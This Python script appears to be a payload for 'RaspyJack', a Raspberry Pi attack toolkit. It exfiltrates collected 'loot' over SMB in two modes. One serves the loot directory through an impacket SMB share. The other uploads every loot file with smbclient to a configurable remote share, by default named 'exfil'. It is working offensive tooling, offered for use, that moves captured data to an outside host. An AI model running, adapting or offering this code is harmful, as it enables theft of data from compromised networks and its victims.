#!/usr/bin/env python3
"""
RaspyJack Payload -- SMB Exfiltration
=======================================
Author: 7h30th3r0n3

Two-mode SMB exfiltration tool:
  Mode 1 (Serve): Start an SMB share on the Pi serving /root/Raspyjack/loot/
  using impacket-smbserver (from Responder's vendored impacket).
  Mode 2 (Upload): Upload loot files to a remote SMB share using smbclient.

Setup / Prerequisites
---------------------
- ``impacket-smbserver`` or ``smbclient`` available on PATH.
- Network connectivity for remote upload mode.

Controls
--------
  OK          -- Start / stop service
  KEY1        -- Toggle mode (Serve / Upload)
  UP / DOWN   -- Scroll file list
  KEY2        -- Configure remote share
  KEY3        -- Exit
"""

import os
import sys
import time
import json
import shutil
import subprocess
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._keyboard_helper import lcd_keyboard

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_ROOT = "/root/Raspyjack/loot"
LOOT_DIR = "/root/Raspyjack/loot/SMBExfil"
CONFIG_DIR = "/root/Raspyjack/config/exfil_smb"
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
os.makedirs(LOOT_ROOT, exist_ok=True)
os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)

MODES = ["Serve", "Upload"]
DEBOUNCE = 0.22
DEFAULT_CONFIG = {
    "remote_host": "192.168.1.100",
    "remote_share": "exfil",
    "remote_user": "",
    "remote_pass": "",
    "share_name": "loot",
}

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "mode_idx": 0,
    "config": dict(DEFAULT_CONFIG),
    "running": False,
    "stop": False,
    "status": "Idle",
    "files_served": 0,
    "files_uploaded": 0,
    "upload_progress": "",
    "log": [],
    "scroll": 0,
    "pi_ip": "",
    "process": None,
}


def _get(key):
    with _lock:
        val = _state[key]
        if isinstance(val, (list, dict)):
            return list(val) if isinstance(val, list) else dict(val)
        return val


def _set(**kw):
    with _lock:
        for k, v in kw.items():
            _state[k] = v


def _add_log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {msg}"
    with _lock:
        _state["log"] = (list(_state["log"]) + [entry])[-30:]


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
def _load_config():
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                loaded = json.load(f)
            merged = {**DEFAULT_CONFIG, **loaded}
            _set(config=merged)
        except Exception:
            _set(config=dict(DEFAULT_CONFIG))
    else:
        _set(config=dict(DEFAULT_CONFIG))
        _save_config()


def _save_config():
    cfg = _get("config")
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------
def _get_pi_ip():
    """Get Pi's IP address."""
    try:
        out = subprocess.run(
            ["hostname", "-I"], capture_output=True, text=True, timeout=5,
        )
        ips = out.stdout.strip().split()
        return ips[0] if ips else "?.?.?.?"
    except Exception:
        return "?.?.?.?"


def _list_loot_files():
    """List files in loot directory."""
    files = []
    if not os.path.isdir(LOOT_ROOT):
        return files
    for dirpath, _, filenames in os.walk(LOOT_ROOT):
        if "SMBExfil" in dirpath:
            continue
        for fname in filenames:
            fpath = os.path.join(dirpath, fname)
            rel = os.path.relpath(fpath, LOOT_ROOT)
            size = os.path.getsize(fpath)
            files.append({"path": fpath, "rel": rel, "size": size})
    return files


# ---------------------------------------------------------------------------
# Mode 1: SMB Server
# ---------------------------------------------------------------------------
def _start_smb_server():
    """Start impacket-smbserver to serve loot."""
    _set(running=True, stop=False, status="Starting SMB server...")
    _add_log("Starting SMB server")

    cfg = _get("config")
    share_name = cfg.get("share_name", "loot")
    ip = _get_pi_ip()
    _set(pi_ip=ip)

    # Try impacket-smbserver (CLI tool or Python module)
    smb_bin = shutil.which("impacket-smbserver")
    if not smb_bin:
        _add_log("impacket-smbserver not found")
        _set(status="Trying Python fallback...")
        _try_python_smbserver(share_name)
        _cleanup_process()
        _set(running=False, status="SMB server stopped")
        _add_log("SMB server stopped")
        return

    cmd = [smb_bin, share_name, LOOT_ROOT, "-smb2support"]

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        _set(process=proc)
        _set(status=f"SMB on {ip}:445")
        _add_log(f"SMB active on {ip}:445")
        _add_log(f"Share: \\\\{ip}\\{share_name}")

        # Give it time to start, check stderr for errors
        time.sleep(2)
        if proc.poll() is not None:
            # Read why it failed
            try:
                out = proc.stdout.read().decode("utf-8", errors="replace")[-200:]
            except Exception:
                out = ""
            rc = proc.returncode
            _add_log(f"Exit code {rc}")
            if "Address already in use" in out:
                _add_log("Port 445 already in use")
                _set(status="Port 445 busy")
            elif "Permission" in out or "Errno 13" in out:
                _add_log("Need root for port 445")
                _set(status="Permission denied")
            else:
                _add_log(f"Err: {out[:40]}")
                _set(status=f"Failed (code {rc})")
        else:
            while not _get("stop"):
                if proc.poll() is not None:
                    _add_log("SMB server exited")
                    break
                time.sleep(1)

    except Exception as exc:
        _add_log(f"Error: {str(exc)[:20]}")
        _set(status=f"Error: {str(exc)[:14]}")
    finally:
        _cleanup_process()
        _set(running=False, status="SMB server stopped")
        _add_log("SMB server stopped")


def _try_python_smbserver(share_name):
    """Try launching smbserver via Python impacket module."""
    cmd = [
        sys.executable, "-c",
        f"from impacket.smbserver import SimpleSMBServer;"
        f"s=SimpleSMBServer();s.addShare('{share_name}','{LOOT_ROOT}');"
        f"s.setSMB2Support(True);s.start()",
    ]
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        _set(process=proc)
        ip = _get_pi_ip()
        _set(status=f"Serving: \\\\{ip}\\{share_name}")
        _add_log(f"Python SMB at \\\\{ip}\\{share_name}")

        time.sleep(2)
        if proc.poll() is not None:
            _add_log(f"Python SMB exited immediately (code {proc.returncode})")
        else:
            while not _get("stop"):
                if proc.poll() is not None:
                    break
                time.sleep(1)
    except Exception as exc:
        _add_log(f"Python SMB fail: {str(exc)[:18]}")
        _set(status="SMB server unavailable")


def _cleanup_process():
    with _lock:
        proc = _state.get("process")
        _state["process"] = None
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Mode 2: Upload to remote SMB
# ---------------------------------------------------------------------------
def _upload_loot():
    """Upload loot files to remote SMB share via smbclient."""
    _set(running=True, stop=False, status="Uploading...")
    _add_log("Starting upload")

    cfg = _get("config")
    host = cfg["remote_host"]
    share = cfg["remote_share"]
    user = cfg.get("remote_user", "")
    passwd = cfg.get("remote_pass", "")

    files = _list_loot_files()
    total = len(files)
    uploaded = 0

    for idx, finfo in enumerate(files):
        if _get("stop"):
            break

        rel = finfo["rel"]
        fpath = finfo["path"]
        _set(upload_progress=f"{idx + 1}/{total}: {rel[:14]}",
             status=f"Upload {idx + 1}/{total}")

        # Build smbclient command
        remote_path = rel.replace("/", "\\")
        remote_dir = os.path.dirname(remote_path)

        smb_cmd = f'put "{fpath}" "{remote_path}"'
        if remote_dir:
            smb_cmd = f'mkdir "{remote_dir}"; {smb_cmd}'

        cmd = ["smbclient", f"//{host}/{share}"]
        if user:
            cmd.extend(["-U", f"{user}%{passwd}"])
        else:
            cmd.extend(["-N"])
        cmd.extend(["-c", smb_cmd])

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30,
            )
            if result.returncode == 0:
                uploaded += 1
                _add_log(f"OK: {rel[:20]}")
            else:
                _add_log(f"FAIL: {rel[:18]}")
        except FileNotFoundError:
            _add_log("smbclient not found")
            _set(status="smbclient not found")
            break
        except Exception as exc:
            _add_log(f"Err: {str(exc)[:18]}")

    _set(running=False, files_uploaded=uploaded,
         status=f"Uploaded {uploaded}/{total}")
    _add_log(f"Upload done: {uploaded}/{total}")


# ---------------------------------------------------------------------------
# Start / Stop
# ---------------------------------------------------------------------------
def _start_service():
    if _get("running"):
        return
    mode = MODES[_get("mode_idx")]
    if mode == "Serve":
        threading.Thread(target=_start_smb_server, daemon=True).start()
    else:
        threading.Thread(target=_upload_loot, daemon=True).start()


def _stop_service():
    _set(stop=True)
    _cleanup_process()


# ---------------------------------------------------------------------------
# LCD drawing
# ---------------------------------------------------------------------------
def _draw_lcd():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    mode = MODES[_get("mode_idx")]
    running = _get("running")
    status = _get("status")
    log = _get("log")
    scroll = _get("scroll")

    # Header
    d.rectangle((0, 0, 127, 12), fill="#111")
    d.text((2, 1), f"SMB EXFIL [{mode}]", font=font, fill="#00AAFF")
    d.ellipse((118, 3, 124, 9), fill="#00FF00" if running else "#666")

    y = 14
    if mode == "Serve":
        ip = _get("pi_ip") or _get_pi_ip()
        cfg = _get("config")
        d.text((2, y), f"IP: {ip}", font=font, fill="#AAAAAA")
        y += 12
        d.text((2, y), f"Share: {cfg['share_name']}", font=font, fill="#888")
        y += 14
    else:
        cfg = _get("config")
        d.text((2, y), f"Host: {cfg['remote_host']}", font=font, fill="#AAAAAA")
        y += 12
        d.text((2, y), f"Share: {cfg['remote_share']}", font=font, fill="#888")
        y += 12
        progress = _get("upload_progress")
        if progress:
            d.text((2, y), progress[:21], font=font, fill="#FFCC00")
        y += 14

    # Log
    visible = 3
    start = max(0, len(log) - visible - scroll)
    end = min(start + visible, len(log))
    for i in range(start, end):
        fg = "#888"
        if "OK:" in log[i]:
            fg = "#00AA44"
        elif "FAIL" in log[i] or "Err" in log[i]:
            fg = "#FF4444"
        d.text((2, y), log[i][:21], font=font, fill=fg)
        y += 11

    # Status
    d.rectangle((0, 106, 127, 115), fill="#0a0a0a")
    d.text((2, 107), status[:21], font=font, fill="#FFCC00")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    action = "STOP" if running else "START"
    d.text((2, 117), f"OK:{action} K1:mode K3:x", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


def _show_msg(line1, line2=""):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), line1[:21], font=font, fill="#00FF00")
    if line2:
        d.text((4, 65), line2[:21], font=font, fill="#888")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.2)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    _load_config()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 16), "SMB EXFILTRATION", font=font, fill="#00AAFF")
    d.text((4, 32), "Serve or Upload loot", font=font, fill="#888")
    d.text((4, 52), "OK=Start/Stop", font=font, fill="#666")
    d.text((4, 64), "K1=Mode  K2=Config", font=font, fill="#666")
    d.text((4, 76), "K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    _set(pi_ip=_get_pi_ip())
    last_press = 0.0

    try:
        while True:
            btn = get_button(PINS, GPIO)
            now = time.time()
            if btn and (now - last_press) < DEBOUNCE:
                btn = None
            if btn:
                last_press = now

            if btn == "KEY3":
                _stop_service()
                break

            elif btn == "OK":
                if _get("running"):
                    _stop_service()
                else:
                    _start_service()

            elif btn == "KEY1":
                if not _get("running"):
                    idx = _get("mode_idx")
                    _set(mode_idx=(idx + 1) % len(MODES))

            elif btn == "KEY2":
                if not _get("running"):
                    cfg = _get("config")
                    # Edit remote host
                    new_host = lcd_keyboard(LCD, font, PINS, GPIO,
                                            title="Remote Host",
                                            default=cfg["remote_host"],
                                            charset="ip")
                    if new_host:
                        cfg["remote_host"] = new_host
                    # Edit share name
                    new_share = lcd_keyboard(LCD, font, PINS, GPIO,
                                             title="Share Name",
                                             default=cfg["remote_share"],
                                             charset="full")
                    if new_share:
                        cfg["remote_share"] = new_share
                    # Edit username
                    new_user = lcd_keyboard(LCD, font, PINS, GPIO,
                                            title="Username (empty=anon)",
                                            default=cfg.get("remote_user", ""),
                                            charset="full")
                    if new_user is not None:
                        cfg["remote_user"] = new_user
                    # Edit password
                    new_pass = lcd_keyboard(LCD, font, PINS, GPIO,
                                            title="Password",
                                            default=cfg.get("remote_pass", ""),
                                            charset="full")
                    if new_pass is not None:
                        cfg["remote_pass"] = new_pass
                    _set(config=cfg)
                    _save_config()
                    _show_msg("Config saved!")

            elif btn == "UP":
                s = _get("scroll")
                _set(scroll=min(max(0, len(_get("log")) - 3), s + 1))

            elif btn == "DOWN":
                s = _get("scroll")
                _set(scroll=max(0, s - 1))

            _draw_lcd()
            time.sleep(0.05)

    finally:
        _stop_service()
        time.sleep(0.3)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
